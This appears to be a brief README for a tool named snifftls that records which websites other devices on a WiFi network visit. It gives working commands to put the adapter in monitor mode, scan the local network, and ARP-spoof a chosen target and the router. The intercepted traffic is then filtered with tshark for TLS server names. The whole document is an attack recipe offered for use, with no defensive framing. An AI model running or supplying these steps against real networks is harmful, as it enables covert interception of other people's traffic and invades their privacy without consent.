Sniff WiFi websites visited traffic

*requires tshark
- For analyzing other devices connected to the wifi, use in monitor mode.

{
    sudo ip link set wlan0 down
    sudo iw dev wlan0 set type monitor
    sudo ip link set wlan0 up
}

Alternatively, use:
{
    sudo airmon-ng start wlan0
}
- Use with arpspoofing
--------------------------------------------------------------------------
//Targetting//
- 1. ip route | grep default
- 2. sudo arp-scan --localnet
- 3. sudo arpspoof -i wlanX -t 192.168.X.X (//target) -r 192.168.X.X (//router)
- 4. sudo tshark -i wlan1 -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name
- 5. sudo pkill arpspoof
     echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

--------------------------------------------------------------------------
//Compilation//
- 1. gcc snifftls.c -o snifftls
  2. sudo ./snifftls
